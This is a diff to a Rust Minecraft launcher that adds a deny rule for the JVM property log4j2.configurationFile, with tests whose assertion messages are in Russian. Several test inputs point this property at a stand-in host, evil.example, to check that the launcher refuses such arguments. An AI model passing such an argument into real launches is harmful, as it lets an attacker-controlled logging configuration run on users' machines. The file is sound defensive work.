@@ -133,6 +133,8 @@ const ALLOWED_D_PROPERTY_KEYS: &[&str] = &[
 const ALLOWED_D_PROPERTY_PREFIXES: &[&str] =
     &["forge.", "neoforge.", "minecraft.launcher.", "log4j2."];
 
+const DENIED_D_PROPERTY_KEYS: &[&str] = &["log4j2.configurationFile"];
+
 fn is_size_value(value: &str) -> bool {
     let digits = value
         .strip_suffix(|c: char| matches!(c, 'k' | 'K' | 'm' | 'M' | 'g' | 'G'))
@@ -180,6 +182,9 @@ fn is_allowed_jvm_arg(arg: &str) -> bool {
     if let Some(rest) = arg.strip_prefix("-D") {
         let key = rest.split_once('=').map(|(k, _)| k).unwrap_or(rest);
         return !key.is_empty()
+            && !DENIED_D_PROPERTY_KEYS
+                .iter()
+                .any(|denied| key.eq_ignore_ascii_case(denied))
             && (ALLOWED_D_PROPERTY_KEYS.contains(&key)
                 || ALLOWED_D_PROPERTY_PREFIXES
                     .iter()
@@ -1294,6 +1299,62 @@ mod jvm_args_guard_tests {
         .collect();
         finalize_jvm_args(safe_args, None, true, None, None)
             .expect("безопасный серверный конфиг запускается");
+    }
+
+    #[test]
+    fn server_config_with_log4j2_config_file_aborts_launch() {
+        let server_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+            "-Dlog4j2.configurationFile=http://evil.example/log4j2.xml",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        let error = finalize_jvm_args(server_args, None, true, None, None).expect_err(
+            "удалённая log4j2-конфигурация из серверного конфига должна отклонять запуск",
+        );
+
+        assert!(
+            error
+                .to_string()
+                .contains("-Dlog4j2.configurationFile=http://evil.example/log4j2.xml"),
+            "ошибка должна называть опасный аргумент: {error}"
+        );
+
+        let safe_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+        finalize_jvm_args(safe_args, None, true, None, None)
+            .expect("тот же конфиг без log4j2.configurationFile запускается");
+    }
+
+    #[test]
+    fn blocks_log4j2_configuration_file_property() {
+        for arg in [
+            "-Dlog4j2.configurationFile=file:///etc/log4j2.xml",
+            "-Dlog4j2.configurationFile=relative.xml",
+            "-Dlog4j2.configurationFile",
+            "-Dlog4j2.ConfigurationFile=http://evil.example/log4j2.xml",
+        ] {
+            let message = validation_error(&[arg]);
+            assert!(
+                message.contains(arg),
+                "ошибка должна называть аргумент {arg}: {message}"
+            );
+        }
+
+        validate_jvm_args(&["-Dlog4j2.formatMsgNoLookups=true".to_string()])
+            .expect("легитимное log4j2-свойство не должно запрещаться");
     }
 
     #[test]
